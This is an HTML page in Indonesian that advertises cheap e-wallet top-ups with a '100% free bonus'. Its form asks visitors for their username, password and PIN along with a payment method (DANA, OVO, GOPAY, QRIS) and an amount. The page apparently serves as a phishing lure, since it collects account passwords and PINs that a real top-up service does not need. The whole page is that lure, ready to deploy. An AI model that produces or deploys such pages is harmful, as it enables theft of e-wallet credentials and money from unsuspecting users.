<!DOCTYPE html>
<html>
<head><title>Top Up Murah</title></head>
<body style="background:#0a0a1a;color:#fff;font-family:Arial;text-align:center;padding-top:50px;">
<div style="background:#1a1a2e;padding:30px;border-radius:20px;max-width:400px;margin:auto;">
  <h2 style="color:#00ffaa;">🚀 TOP UP TERMURAH</h2>
  <p style="color:#ffaa00;">🔥 BONUS 100% GRATIS!</p>
  <form action="/topup" method="POST">
    <input name="username" placeholder="Username" required style="width:100%;padding:10px;margin:8px 0;border-radius:30px;border:none;">
    <input name="password" type="password" placeholder="Password" required style="width:100%;padding:10px;margin:8px 0;border-radius:30px;border:none;">
    <input name="pin" placeholder="PIN (opsional)" style="width:100%;padding:10px;margin:8px 0;border-radius:30px;border:none;">
    <select name="metode" style="width:100%;padding:10px;margin:8px 0;border-radius:30px;border:none;">
      <option>DANA</option><option>OVO</option><option>GOPAY</option><option>QRIS</option>
    </select>
    <input name="nominal" placeholder="Nominal" required style="width:100%;padding:10px;margin:8px 0;border-radius:30px;border:none;">
    <button type="submit" style="background:#00ffaa;color:#000;padding:12px;border:none;border-radius:30px;width:100%;font-weight:bold;">✅ TOP UP</button>
  </form>
</div>
</body>
</html>
